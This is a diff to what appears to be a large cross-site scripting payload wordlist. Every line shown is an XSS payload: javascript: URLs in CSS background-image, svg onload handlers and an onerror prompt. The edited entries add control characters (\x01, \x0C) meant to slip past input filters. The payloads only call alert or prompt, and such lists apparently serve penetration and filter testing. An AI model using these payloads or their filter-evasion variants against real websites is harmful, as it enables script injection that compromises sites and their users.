@@ -857,7 +857,7 @@ dfsse%3cimg%20src%3da%20onerror%3dalert(1)%3ez1668cyj2pi
 <DIV STYLE="background-image: url(&#1,javascript:alert('XSS))">
 <DIV+STYLE="background-image: url(javascript:alert(1))">
 <div style="background-image:url(javascript:alert('Successful XSS'))">
-<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image: url(\x01javascript:alert('XSS'))">
 <DIV STYLE="background-image: url(javascript:alert('XSS'))">
 <DIV STYLE="background-image: url(javascript:javascript:alert(1))">
 "<div style="background-image: url(x)" onerror=prompt(document.domain);>
@@ -2361,8 +2361,8 @@ STYLE="xss:expr/*XSS*/ession(alert('XSS')">
 #<!--><svg onload=alert(1)-->
 --><svg onload=alert(1)>
 <!--><svg onload=alert(1)-->
-<svgonload=alert(1)>
-<svgonload=alert(1)>
+<svg\x0Conload\x0C=\x0Calert(1)\x0C>
+<svg\x0Conload=alert(1)>
 <svg onload=alert(1)//
 <svg onload=alert(1)>
 <svg////////onload=alert(1)>
